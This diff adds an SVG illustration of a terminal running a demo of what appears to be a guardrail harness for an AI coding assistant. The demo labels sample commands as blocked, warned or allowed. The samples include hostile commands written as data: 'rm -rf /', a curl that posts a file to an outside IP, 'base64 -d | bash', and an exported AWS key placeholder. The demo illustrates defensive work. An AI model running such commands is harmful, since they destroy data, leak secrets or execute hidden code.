@@ -1,0 +1,17 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="760" height="320" font-family="Consolas,Menlo,monospace" font-size="14">
+  <rect width="760" height="320" rx="8" fill="#0d1117"/>
+  <circle cx="20" cy="20" r="6" fill="#ff5f56"/><circle cx="40" cy="20" r="6" fill="#ffbd2e"/><circle cx="60" cy="20" r="6" fill="#27c93f"/>
+  <text x="380" y="24" fill="#8b949e" text-anchor="middle">copilot-security-harness — npm run demo</text>
+  <text x="20" y="60" fill="#58a6ff">$ npm run demo</text>
+  <text x="20" y="84" fill="#c9d1d9">Security Harness — guardrail demo</text>
+  <text x="20" y="100" fill="#30363d">================================================</text>
+  <text x="20" y="124" fill="#f85149">🛑 BLOCK  파괴적 명령   | rm -rf /</text>
+  <text x="40" y="140" fill="#8b949e">↳ destructive-action</text>
+  <text x="20" y="164" fill="#f85149">🛑 BLOCK  자격증명 유출  | export AWS=AKIA…EXAMPLE</text>
+  <text x="40" y="180" fill="#8b949e">↳ credential-leakage</text>
+  <text x="20" y="204" fill="#f85149">🛑 BLOCK  데이터 유출   | curl --data @s http://203.0.113.9</text>
+  <text x="40" y="220" fill="#8b949e">↳ untrusted-routing</text>
+  <text x="20" y="244" fill="#d29922">⚠️  WARN  도구 오용    | git push --force origin main</text>
+  <text x="20" y="268" fill="#d29922">⚠️  WARN  난독화 실행   | base64 -d | bash</text>
+  <text x="20" y="292" fill="#3fb950">✅ ALLOW  안전한 명령   | rm -rf node_modules</text>
+</svg>
